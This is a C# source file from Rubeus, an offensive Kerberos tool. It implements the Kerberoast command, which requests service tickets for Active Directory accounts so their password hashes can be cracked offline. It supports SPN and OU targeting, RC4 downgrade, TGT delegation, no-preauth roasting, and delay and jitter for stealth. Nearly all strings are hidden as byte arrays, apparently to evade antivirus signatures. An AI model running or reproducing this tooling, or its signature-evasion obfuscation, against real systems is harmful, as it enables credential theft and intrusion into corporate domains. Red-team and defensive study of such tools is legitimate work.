using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text;


namespace Rubeus.Commands
{
    public class Kerberoast : ICommand
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
        public static string CommandName => S(new byte[] { 107, 101, 114, 98, 101, 114, 111, 97, 115, 116 });

        public void Execute(Dictionary<string, string> arguments)
        {
            string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);

            Console.WriteLine(S(new byte[] { 13, 10, 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 75, 101, 114, 98, 101, 114, 111, 97, 115, 116, 105, 110, 103, 13, 10 }));

            string spn = S(new byte[] {});
            List<string> spns = null;
            string user = S(new byte[] {});
            string OU = S(new byte[] {});
            string outFile = S(new byte[] {});
            string domain = S(new byte[] {});
            string dc = S(new byte[] {});
            string ldapFilter = S(new byte[] {});
            string supportedEType = S(new byte[] { 114, 99, 52 });
            bool useTGTdeleg = false;
            bool listUsers = false;
            KRB_CRED TGT = null;
            string pwdSetAfter = S(new byte[] {});
            string pwdSetBefore = S(new byte[] {});
            int resultLimit = 0;
            int delay = 0;
            int jitter = 0;
            bool simpleOutput = false;
            bool enterprise = false;
            bool autoenterprise = false;
            bool ldaps = false;
            System.Net.NetworkCredential cred = null;
            string nopreauth = S(new byte[] {});

            if (arguments.ContainsKey(S(new byte[] { 47, 115, 112, 110 })))
            {
                // roast a specific single SPN
                spn = arguments[S(new byte[] { 47, 115, 112, 110 })];
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 115, 112, 110, 115 })))
            {
                spns = new List<string>();
                if (System.IO.File.Exists(arguments[S(new byte[] { 47, 115, 112, 110, 115 })]))
                {
                    string fileContent = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(arguments[S(new byte[] { 47, 115, 112, 110, 115 })]));
                    foreach (string s in fileContent.Split('\n'))
                    {
                        if (!String.IsNullOrEmpty(s))
                        {
                            spns.Add(s.Trim());
                        }
                    }
                }
                else
                {
                    foreach (string s in arguments[S(new byte[] { 47, 115, 112, 110, 115 })].Split(','))
                    {
                        spns.Add(s);
                    }
                }
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 117, 115, 101, 114 })))
            {
                // roast a specific user (or users, comma-separated
                user = arguments[S(new byte[] { 47, 117, 115, 101, 114 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 111, 117 })))
            {
                // roast users from a specific OU
                OU = arguments[S(new byte[] { 47, 111, 117 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })))
            {
                // roast users from a specific domain
                domain = arguments[S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 99 })))
            {
                // use a specific domain controller for kerberoasting
                dc = arguments[S(new byte[] { 47, 100, 99 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })))
            {
                // output kerberoasted hashes to a file instead of to the console
                outFile = arguments[S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 115, 105, 109, 112, 108, 101 })))
            {
                // output kerberoasted hashes to the output file format instead, to the console
                simpleOutput = true;
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 97, 101, 115 })))
            {
                // search for users w/ AES encryption enabled and request AES tickets
                supportedEType = S(new byte[] { 97, 101, 115 });
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 114, 99, 52, 111, 112, 115, 101, 99 })))
            {
                // search for users without AES encryption enabled roast
                supportedEType = S(new byte[] { 114, 99, 52, 111, 112, 115, 101, 99 });
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 116, 105, 99, 107, 101, 116 })))
            {
                // use an existing TGT ticket when requesting/roasting
                string kirbi64 = arguments[S(new byte[] { 47, 116, 105, 99, 107, 101, 116 })];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    TGT = new KRB_CRED(kirbiBytes);
                }
                else if (System.IO.File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = System.IO.File.ReadAllBytes(kirbi64);
                    TGT = new KRB_CRED(kirbiBytes);
                }
                else
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 116, 105, 99, 107, 101, 116, 58, 88, 32, 109, 117, 115, 116, 32, 101, 105, 116, 104, 101, 114, 32, 98, 101, 32, 97, 32, 46, 107, 105, 114, 98, 105, 32, 102, 105, 108, 101, 32, 111, 114, 32, 97, 32, 98, 97, 115, 101, 54, 52, 32, 101, 110, 99, 111, 100, 101, 100, 32, 46, 107, 105, 114, 98, 105, 13, 10 }));
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 117, 115, 101, 116, 103, 116, 100, 101, 108, 101, 103 })) || arguments.ContainsKey(S(new byte[] { 47, 116, 103, 116, 100, 101, 108, 101, 103 })))
            {
                // use the TGT delegation trick to get a delegated TGT to use for roasting
                useTGTdeleg = true;
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 112, 119, 100, 115, 101, 116, 97, 102, 116, 101, 114 })))
            {
                // filter for roastable users w/ a pwd set after a specific date
                pwdSetAfter = arguments[S(new byte[] { 47, 112, 119, 100, 115, 101, 116, 97, 102, 116, 101, 114 })];
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 112, 119, 100, 115, 101, 116, 98, 101, 102, 111, 114, 101 })))
            {
                // filter for roastable users w/ a pwd set before a specific date
                pwdSetBefore = arguments[S(new byte[] { 47, 112, 119, 100, 115, 101, 116, 98, 101, 102, 111, 114, 101 })];
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 108, 100, 97, 112, 102, 105, 108, 116, 101, 114 })))
            {
                // additional LDAP targeting filter
                ldapFilter = arguments[S(new byte[] { 47, 108, 100, 97, 112, 102, 105, 108, 116, 101, 114 })].Trim('"').Trim('\'');
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 114, 101, 115, 117, 108, 116, 108, 105, 109, 105, 116 })))
            {
                // limit the number of roastable users
                resultLimit = Convert.ToInt32(arguments[S(new byte[] { 47, 114, 101, 115, 117, 108, 116, 108, 105, 109, 105, 116 })]);
            }
            
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 101, 108, 97, 121 })))
            {
                delay = Int32.Parse(arguments[S(new byte[] { 47, 100, 101, 108, 97, 121 })]);
                if(delay < 100)
                {
                    Console.WriteLine(S(new byte[] { 91, 33, 93, 32, 87, 65, 82, 78, 73, 78, 71, 58, 32, 100, 101, 108, 97, 121, 32, 105, 115, 32, 105, 110, 32, 109, 105, 108, 108, 105, 115, 101, 99, 111, 110, 100, 115, 33, 32, 80, 108, 101, 97, 115, 101, 32, 101, 110, 116, 101, 114, 32, 97, 32, 118, 97, 108, 117, 101, 32, 62, 32, 49, 48, 48, 46, 13, 10 }));
                    return;
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 106, 105, 116, 116, 101, 114 })))
            {
                try
                {
                    jitter = Int32.Parse(arguments[S(new byte[] { 47, 106, 105, 116, 116, 101, 114 })]);
                }
                catch {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 74, 105, 116, 116, 101, 114, 32, 109, 117, 115, 116, 32, 98, 101, 32, 97, 110, 32, 105, 110, 116, 101, 103, 101, 114, 32, 98, 101, 116, 119, 101, 101, 110, 32, 49, 45, 49, 48, 48, 46, 13, 10 }));
                    return;
                }
                if(jitter <= 0 || jitter > 100)
                {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 74, 105, 116, 116, 101, 114, 32, 109, 117, 115, 116, 32, 98, 101, 32, 98, 101, 116, 119, 101, 101, 110, 32, 49, 45, 49, 48, 48, 13, 10 }));
                    return;
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 115, 116, 97, 116, 115 })))
            {
                // output stats on the number of kerberoastable users, don't actually roast anything
                listUsers = true;
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 101, 110, 116, 101, 114, 112, 114, 105, 115, 101 })))
            {
                // use enterprise principals in the request, requires /spn and (/ticket or /tgtdeleg)
                enterprise = true;
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 97, 117, 116, 111, 101, 110, 116, 101, 114, 112, 114, 105, 115, 101 })))
            {
                // use enterprise principals in the request if roasting with the SPN fails, requires /ticket or /tgtdeleg, does nothing is /spn or /spns is supplied
                autoenterprise = true;
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 108, 100, 97, 112, 115 })))
            {
                ldaps = true;
            }

            if (String.IsNullOrEmpty(domain))
            {
                // try to get the current domain
                domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 99, 114, 101, 100, 117, 115, 101, 114 })))
            {
                // provide an alternate user to use for connection creds
                if (!Regex.IsMatch(arguments[S(new byte[] { 47, 99, 114, 101, 100, 117, 115, 101, 114 })], ".+\\.+", RegexOptions.IgnoreCase))
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 99, 114, 101, 100, 117, 115, 101, 114, 32, 115, 112, 101, 99, 105, 102, 105, 99, 97, 116, 105, 111, 110, 32, 109, 117, 115, 116, 32, 98, 101, 32, 105, 110, 32, 102, 113, 100, 110, 32, 102, 111, 114, 109, 97, 116, 32, 40, 100, 111, 109, 97, 105, 110, 46, 99, 111, 109, 92, 117, 115, 101, 114, 41, 13, 10 }));
                    return;
                }

                string[] parts = arguments[S(new byte[] { 47, 99, 114, 101, 100, 117, 115, 101, 114 })].Split('\\');
                string domainName = parts[0];
                string userName = parts[1];

                // provide an alternate password to use for connection creds
                if (!arguments.ContainsKey(S(new byte[] { 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100 })))
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100, 32, 105, 115, 32, 114, 101, 113, 117, 105, 114, 101, 100, 32, 119, 104, 101, 110, 32, 115, 112, 101, 99, 105, 102, 121, 105, 110, 103, 32, 47, 99, 114, 101, 100, 117, 115, 101, 114, 13, 10 }));
                    return;
                }

                string password = arguments[S(new byte[] { 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100 })];

                cred = new System.Net.NetworkCredential(userName, password, domainName);
            }

            // roast with a user configured to not require pre-auth
            if (arguments.ContainsKey(S(new byte[] { 47, 110, 111, 112, 114, 101, 97, 117, 116, 104 })))
            {
                nopreauth = arguments[S(new byte[] { 47, 110, 111, 112, 114, 101, 97, 117, 116, 104 })];
            }

            if (!String.IsNullOrWhiteSpace(nopreauth) && (String.IsNullOrWhiteSpace(spn) && (spns == null || spns.Count < 1)))
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 115, 112, 110, 32, 111, 114, 32, 47, 115, 112, 110, 115, 32, 105, 115, 32, 114, 101, 113, 117, 105, 114, 101, 100, 32, 119, 104, 101, 110, 32, 115, 112, 101, 99, 105, 102, 121, 105, 110, 103, 32, 47, 110, 111, 112, 114, 101, 97, 117, 116, 104, 13, 10 }));
                return;
            }

            Roast.Kerberoast(spn, spns, user, OU, domain, dc, cred, outFile, simpleOutput, TGT, useTGTdeleg, supportedEType, pwdSetAfter, pwdSetBefore, ldapFilter, resultLimit, delay, jitter, listUsers, enterprise, autoenterprise, ldaps, nopreauth);
        }
    }
}